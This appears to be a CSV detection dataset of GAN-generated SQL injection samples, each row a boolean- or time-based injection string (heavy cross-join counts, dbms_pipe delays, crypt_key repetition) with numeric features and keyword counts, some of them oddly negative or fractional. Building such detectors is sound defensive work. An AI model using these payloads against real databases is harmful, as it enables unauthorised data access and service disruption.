id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000475,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,7.025530159281268,237.64405822753906,82.88489532470703,22.791744232177734,85.32984924316406,0.3130551278591156,33.02249526977539,24.39928436279297,1.3225328922271729,0.26655542850494385,0.13479788601398468,0.33499011397361755,0.15034781396389008,3.974036931991577,0.1863963007926941,1.0089926719665527,0.021925516426563263,0.1726374328136444,-0.1747189462184906,-0.733237624168396,5.608816623687744,8.403882026672363,0.981283962726593,0.5127429366111755,1.3935987949371338,-0.1162724643945694,0.18716493248939514,0.21916037797927856,2.269988536834717,1.095001459121704,1.3789737224578857,-0.8056971430778503,-0.09891829639673233,-0.2313799113035202,0.3662581145763397,1.1099708080291748,7.564002513885498,0.9617169499397278,1.3005820512771606,-0.010453525930643082,0.603298544883728,0.739661693572998,0.20421189069747925,0.2713114619255066,0.024956606328487396,0.4431373178958893,0.311104953289032,0.4124925136566162,0.28213104605674744,0.5277419090270996,0.08121612668037415,0.2123633772134781,-0.6008151173591614,0.5540899038314819,0.0809071809053421,-0.4378436207771301,0.7468425631523132,0.07309021055698395,-0.820735514163971,-0.7441577315330505,-0.51633220911026,0.046469658613204956,0.5937966704368591,5.824480056762695,-0.1494283229112625,-0.0010261244606226683,0.07756468653678894,0.34906941652297974,-0.19438377022743225,0.14606554806232452,-0.2755125164985657,1.1233899593353271,-0.5785253643989563,0.1246594712138176,0.31104594469070435,-0.9795001745223999,1.474923014640808,0.700628936290741,-0.4160001575946808,-0.21736781299114227,0.014405352994799614,9.286324501037598,1.1555224657058716,0.4515511691570282,0.44168317317962646,-0.561194121837616,0.9483060836791992,0.5143682360649109,-0.6354213953018188
GAN_000476,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000042,5.902870979039479,210.9812774658203,78.31355285644531,21.293514251708984,60.274818420410156,0.1652650088071823,38.22319412231445,28.857624053955078,1.145285964012146,0.24531161785125732,0.12202898412942886,0.31614813208580017,0.1440504789352417,3.8750436305999756,0.5889247059822083,0.7853260040283203,0.1847778707742691,0.11187062412500381,-0.10909668356180191,-0.47778791189193726,5.841951847076416,6.4951372146606445,1.135128378868103,0.24204403162002563,1.284170150756836,-0.38032954931259155,0.17300820350646973,0.360766738653183,1.887279987335205,0.9618484973907471,0.9458537101745605,-0.7036035060882568,-0.1165064349770546,-0.46916767954826355,0.36035361886024475,1.3953808546066284,7.532537460327148,0.9676303267478943,1.1445163488388062,0.4152534008026123,0.42017656564712524,0.8898984789848328,0.3093532621860504,0.13013334572315216,-0.15337029099464417,0.4500245451927185,0.2490161657333374,0.32124099135398865,0.23033222556114197,0.3838484585285187,0.05164634436368942,0.20499511063098907,-0.26345759630203247,0.23321670293807983,0.06431721895933151,-0.4856068193912506,0.5479588508605957,0.16951879858970642,-0.6082639694213867,-0.4490003287792206,-0.32563653588294983,0.18610219657421112,0.3889569640159607,4.027286052703857,-0.2789226174354553,0.010607401840388775,0.051327094435691833,0.04132094979286194,-0.5477632284164429,0.16426125168800354,-0.43793946504592896,0.78644859790802,-0.7162884473800659,0.08804045617580414,0.031976308673620224,-0.9945721626281738,1.3434392213821411,0.6708900332450867,-0.5761337876319885,-0.19366203248500824,-0.017231687903404236,5.710630893707275,1.073930025100708,0.2071983814239502,0.36295974254608154,-0.3843446969985962,0.4847933351993561,0.570003092288971,-0.24912182986736298
GAN_000477,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000016,6.561382902374685,211.2698516845703,93.90721130371094,22.521324157714844,85.27037048339844,0.2611410915851593,37.081764221191406,28.58687973022461,1.1736661195755005,0.23975318670272827,0.12746287882328033,0.34593066573143005,0.14555442333221436,3.966426134109497,0.3225153088569641,1.0477757453918457,0.297407329082489,0.11460112780332565,-0.18388420343399048,-0.49863436818122864,8.194318771362305,10.376842498779297,1.2373101711273193,0.11567898094654083,1.37593674659729,-0.35312673449516296,0.14311127364635468,0.26372116804122925,1.2503888607025146,0.8918400406837463,1.2015775442123413,-0.8726808428764343,-0.1384081393480301,-0.16577136516571045,0.381149560213089,1.221838116645813,7.044996738433838,1.0470143556594849,1.176750898361206,0.20688723027706146,0.5199800133705139,0.7150989770889282,0.21819771826267242,0.19016751646995544,0.3555296063423157,0.12614601850509644,0.03765943646430969,0.34164321422576904,0.2759958803653717,0.37179622054100037,0.18644316494464874,0.12584340572357178,-0.3468701243400574,0.5383474230766296,0.27968868613243103,-0.5836678743362427,0.648226797580719,0.29409223794937134,-0.643346905708313,-0.5605213046073914,-0.16041859984397888,-0.475105881690979,0.2872575521469116,6.205905437469482,-0.25496822595596313,0.01900837942957878,0.09961340576410294,-0.2771754860877991,-0.05612398311495781,0.6164634227752686,-0.2780803442001343,1.2467952966690063,-0.5232020020484924,0.09008235484361649,0.25248438119888306,-0.5956968069076538,1.3589478731155396,0.7952490448951721,-0.5160332918167114,-0.22985424101352692,-0.32833001017570496,11.895706176757812,1.157660722732544,0.18903867900371552,0.5673404335975647,-1.146130919456482,0.8881744146347046,0.519934892654419,-0.5714976191520691
GAN_000478,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,5.700634156879245,240.52098083496094,72.45629119873047,18.3511905670166,70.13397979736328,0.27508479356765747,39.616790771484375,24.120529174804688,1.3671479225158691,0.28121626377105713,0.14302827417850494,0.3137906491756439,0.15403948724269867,3.98808217048645,0.6450042128562927,0.590030312538147,0.13631899654865265,0.10707581043243408,-0.05568624287843704,-0.44778501987457275,3.8936657905578613,5.882715225219727,1.774868130683899,0.348727285861969,1.3583089113235474,-0.25237494707107544,0.041464146226644516,0.08822851628065109,1.519619345664978,0.9162560105323792,0.8425686359405518,-0.43834635615348816,-0.001144859124906361,-0.37855175137519836,0.38607990741729736,1.217522382736206,6.452958106994629,0.9031742811203003,1.125622272491455,0.344660222530365,0.487684041261673,0.6946302056312561,0.06543722748756409,0.20862841606140137,-0.10722177475690842,0.4333365559577942,0.33278390765190125,0.28687819838523865,0.19357818365097046,0.3430074155330658,0.07409274578094482,0.09259504824876785,-0.24015747010707855,0.2457353174686432,0.05558997392654419,-0.5022296905517578,0.6045491695404053,-0.15752698481082916,-0.44290482997894287,-0.3285652995109558,-0.6407428979873657,0.1481122076511383,0.34658393263816833,3.5013844966888428,0.012236502021551132,0.04940209910273552,0.09012584388256073,0.5148414969444275,-0.2626873850822449,0.2955646514892578,-0.2980365753173828,0.7329580187797546,-0.8325969576835632,0.07476738095283508,0.06065339595079422,-0.9543627500534058,1.1083205938339233,0.7811669707298279,-0.45408153533935547,-0.14999045431613922,-0.07341592013835907,8.1577787399292,1.1741801500320435,-0.022654742002487183,0.21564263105392456,-0.10621591657400131,0.6751921772956848,0.44651150703430176,-0.432950496673584
GAN_000479,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,6.523640097191623,269.0765380859375,90.95730590820312,17.453901290893555,82.69244384765625,0.28027236461639404,46.02607345581055,24.732486724853516,1.0413835048675537,0.2793866991996765,0.09278227388858795,0.29743555188179016,0.14451894164085388,4.079164981842041,0.9508618712425232,0.6765586733818054,-0.10035460442304611,0.11243850737810135,-0.0285990908741951,-0.5049540996551514,7.381949424743652,6.534192085266113,1.626605749130249,0.44094035029411316,1.5600637197494507,-0.5902144908905029,0.14847302436828613,0.1724228858947754,2.2134602069854736,1.2933040857315063,0.9341675043106079,-0.6918739080429077,-0.09149271994829178,-0.04772680997848511,0.5162885785102844,1.1402912139892578,7.172927379608154,0.716336727142334,0.9869787693023682,0.4456746280193329,0.4343269467353821,0.7889460921287537,0.18010811507701874,0.172470360994339,-0.06301315128803253,0.6263243556022644,-0.021511288359761238,0.3297567069530487,0.2763160467147827,0.40529465675354004,0.20214161276817322,0.19491128623485565,-0.14941415190696716,0.5694192051887512,-0.019380711019039154,-0.46846094727516174,0.7855779528617859,-0.013413837179541588,-0.6049100756645203,-0.6362074613571167,-0.5925817489624023,0.10882672667503357,0.38051071763038635,4.52051305770874,-0.13760483264923096,-0.009482302702963352,0.11903517693281174,0.21557500958442688,-0.21806201338768005,0.4422466456890106,-0.7599717974662781,1.1065809726715088,-0.7933738827705383,0.09041357040405273,0.226485475897789,-1.2969073057174683,1.3689249753952026,0.6639599204063416,-0.23235847055912018,-0.35191917419433594,0.21059587597846985,9.143107414245605,1.1446807384490967,0.5600456595420837,0.2868453860282898,-0.6532251834869385,0.8863841891288757,0.4818902909755707,-0.22596757113933563
GAN_000480,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,6.512958632299248,216.89813232421875,84.7484130859375,21.136932373046875,81.57022857666016,0.2798287272453308,33.05271911621094,22.89255142211914,1.2546460628509521,0.2570147216320038,0.12977612018585205,0.33447033166885376,0.15565964579582214,3.935305118560791,0.25047534704208374,1.1498851776123047,0.00019819308363366872,0.1285962462425232,-0.1330064982175827,-0.5367123484611511,6.30387544631958,6.482781887054443,1.758820652961731,0.4284275472164154,1.3485549688339233,-0.5091062188148499,0.23289327323436737,0.12714500725269318,1.7705771923065186,1.04767644405365,0.9065371751785278,-0.5256779193878174,-0.04055105522274971,-0.3194231390953064,0.37842708826065063,1.1890108585357666,6.431621551513672,0.9998335242271423,1.1841691732406616,0.16401410102844238,0.5700109004974365,0.6527287364006042,0.1368393898010254,0.26045235991477966,-0.024453897029161453,0.3183259963989258,0.4282263517379761,0.3036883473396301,0.2677758038043976,0.44112446904182434,0.10983964800834656,0.09403374791145325,-0.5522794127464294,0.4528549909591675,0.003957830369472504,-0.34004801511764526,0.723954975605011,0.04778657853603363,-0.7381038665771484,-0.5361853241920471,-0.4877382814884186,-0.1795916110277176,0.27899104356765747,5.822364330291748,0.005240090191364288,0.042235855013132095,0.10480885952711105,0.26304835081100464,0.026791999116539955,0.2786605954170227,-0.33152177929878235,1.0685311555862427,-0.6955401301383972,0.11195492744445801,0.2108851820230484,-0.8550680875778198,1.2884726524353027,0.8549576997756958,-0.33584073185920715,-0.254852831363678,-0.01285543292760849,9.751171112060547,1.2492905855178833,0.23160889744758606,0.4100915789604187,-0.5787613391876221,0.7176251411437988,0.35308292508125305,-0.5956652164459229
GAN_000481,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",nearest_attack_euclidean,R000073,6.418183231952352,228.01382446289062,89.3462142944336,19.291839599609375,75.31087493896484,0.28704163432121277,40.15150833129883,26.048078536987305,1.2078477144241333,0.28936079144477844,0.1332789957523346,0.3096024692058563,0.15678520500659943,3.9978761672973633,0.6281818747520447,0.9550883769989014,-0.05066125839948654,0.11175842583179474,-0.12007581442594528,-0.4545880854129791,6.452361106872559,5.447064399719238,1.7084139585494995,0.2562445104122162,1.4143908023834229,-0.6674621105194092,0.12044137716293335,0.06093804910778999,1.5168449878692627,1.0794364213943481,1.09609854221344,-0.6427263617515564,-0.09201153367757797,-0.30934789776802063,0.3071615993976593,1.1807137727737427,5.9183197021484375,0.8465604186058044,0.9840136766433716,0.47432249784469604,0.5792694687843323,0.9147220849990845,0.10190416872501373,0.13514107465744019,0.020629964768886566,0.24836258590221405,0.10611577332019806,0.392316073179245,0.2423011213541031,0.4191773235797882,0.16375984251499176,0.139909029006958,-0.4871547222137451,0.6608043313026428,-0.010239236056804657,-0.5280493497848511,0.709337055683136,0.20509935915470123,-0.6005531549453735,-0.39869096875190735,-0.4171575605869293,0.015370722860097885,0.2310965657234192,4.843985080718994,-0.050160378217697144,0.023250924423336983,0.05256318673491478,0.2732504606246948,-0.2200046181678772,0.568623960018158,-0.5313265919685364,1.1173456907272339,-1.0800625085830688,0.09847503900527954,0.029561202973127365,-1.051871418952942,1.2186633348464966,0.8438456058502197,-0.5691566467285156,-0.20658020675182343,-0.21769610047340393,8.856893539428711,1.3085812330245972,0.032907042652368546,0.22413481771945953,-0.6910231113433838,1.0613170862197876,0.348632276058197,-0.5055691599845886
GAN_000482,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,5.741147822360801,242.28762817382812,83.29183959960938,20.464115142822266,75.23321533203125,0.2771981656551361,60.56732177734375,22.037311553955078,1.2455159425735474,0.33465227484703064,0.12809783220291138,0.3382793068885803,0.14332853257656097,3.888643980026245,0.7211306691169739,0.9127357602119446,0.19499190151691437,0.09783241152763367,-0.13456383347511292,-0.027581801638007164,5.518855571746826,8.467089653015137,2.0759692192077637,0.05474261939525604,1.3780841827392578,-0.3449031710624695,-0.05579443275928497,0.13510580360889435,1.718745470046997,1.0274872779846191,0.8490070700645447,-0.7681064605712891,-0.044886697083711624,-0.24856139719486237,0.3723210096359253,1.2152422666549683,6.3970746994018555,0.677424430847168,0.9837764501571655,0.2955757677555084,0.5905113220214844,0.9295505285263062,0.08362534642219543,0.402584433555603,-0.17413902282714844,0.40341946482658386,0.1345832496881485,0.26142895221710205,0.1818767637014389,0.3828924000263214,0.07387270778417587,0.16633830964565277,-0.7337103486061096,0.12041586637496948,0.09628647565841675,-0.0027250200510025024,0.5474699139595032,-0.024235373362898827,-0.578961193561554,-0.5846401453018188,-0.6192446351051331,0.1669873297214508,0.287008136510849,3.7651307582855225,-0.0182659849524498,0.0143496198579669,0.10264575481414795,0.2077654004096985,-0.03707287088036537,0.3757268190383911,-0.46907952427864075,0.8267278671264648,-0.6848903894424438,0.09026972204446793,0.23846827447414398,-1.011793613433838,1.1872090101242065,0.6415509581565857,-0.25069496035575867,-0.2303493469953537,-0.020960502326488495,10.844236373901367,1.176581859588623,0.12728984653949738,0.6630045771598816,-0.5287435054779053,0.6159657835960388,0.6072899103164673,-0.37879282236099243
GAN_000483,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000029,5.102625896168599,208.06639099121094,70.07405853271484,23.492450714111328,72.88863372802734,0.17173969745635986,37.78086471557617,23.5589656829834,1.145688772201538,0.29416826367378235,0.13363711535930634,0.33799028396606445,0.14970313012599945,3.9098501205444336,1.0353766679763794,0.8962686061859131,0.35578763484954834,0.07543894648551941,0.011454417370259762,-0.37472984194755554,5.605806827545166,6.25642204284668,1.7484523057937622,0.29563066363334656,1.468443512916565,-0.24527530372142792,0.21322719752788544,0.230362668633461,1.6671830415725708,0.8867092132568359,0.5412644743919373,-0.36837852001190186,-0.025554951280355453,-0.3382212817668915,0.44618067145347595,1.3952909708023071,6.267411708831787,0.8518904447555542,1.0106207132339478,0.1641426682472229,0.444405198097229,0.6251310110092163,0.06582867354154587,0.03892292454838753,0.03544977307319641,0.36245301365852356,0.0900382250547409,0.23531420528888702,0.16757066547870636,0.3582932651042938,0.12738187611103058,0.15017804503440857,-0.2890118360519409,0.3975869119167328,0.13336698710918427,-0.1066897064447403,0.4863497316837311,0.07951140403747559,-0.42911040782928467,-0.31572821736335754,-0.44645512104034424,0.18682469427585602,0.32314932346343994,3.367715835571289,-0.007030315697193146,0.024758286774158478,0.05703822895884514,0.2397543340921402,-0.1132136881351471,0.06994019448757172,-0.2386685013771057,0.6335382461547852,-0.5046247243881226,0.06690420210361481,0.1792798936367035,-0.5037814378738403,1.0832430124282837,0.7289991974830627,-0.20493903756141663,-0.13792957365512848,0.012640019878745079,7.353989124298096,1.1431891918182373,0.28430622816085815,0.31032174825668335,-0.2641640603542328,0.37962067127227783,0.35261818766593933,-0.10106858611106873
GAN_000484,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,5.26557048531996,211.34080505371094,85.50580596923828,23.122087478637695,63.76856994628906,0.1810721606016159,48.26370620727539,29.553199768066406,1.2626426219940186,0.3088359534740448,0.09812089055776596,0.3348674774169922,0.1342945694923401,3.7648239135742188,1.2035754919052124,0.8471415638923645,0.0949593260884285,0.10994353145360947,-0.19586718082427979,-0.40639612078666687,7.548207759857178,6.402228832244873,2.114725351333618,0.45754092931747437,1.3279107809066772,-0.13247837126255035,-0.15123462677001953,0.22718146443367004,2.3584604263305664,1.0431342124938965,0.6212469935417175,-0.429239958524704,-0.14945834875106812,-0.24239952862262726,0.39255160093307495,1.6507551670074463,6.0878190994262695,0.9417859315872192,1.3674503564834595,-0.006125006824731827,0.6439962983131409,0.7368142604827881,0.25509318709373474,0.5189003944396973,-0.13166093826293945,0.4233276844024658,0.45837438106536865,0.18150754272937775,0.22012881934642792,0.3392767012119293,0.08637743443250656,0.14902707934379578,-0.32838520407676697,0.1553942710161209,-0.04163530468940735,-0.18672288954257965,0.1572391539812088,0.13904032111167908,-0.4754759669303894,-0.20185579359531403,-0.3245122730731964,0.3358284831047058,-0.22766095399856567,4.514864444732666,0.13608776032924652,0.008200100623071194,0.033099230378866196,-0.18077541887760162,-0.13970239460468292,0.2555118799209595,-0.3770936131477356,0.6930414438247681,-0.2738460898399353,0.0844610258936882,0.05509494990110397,-0.6648887395858765,1.1611011028289795,0.6305854320526123,-0.20423439145088196,-0.19094638526439667,-0.12362407147884369,9.468544960021973,1.0461773872375488,0.08990402519702911,0.5329769253730774,-0.2239757776260376,0.22783109545707703,0.11590661853551865,-0.17189139127731323
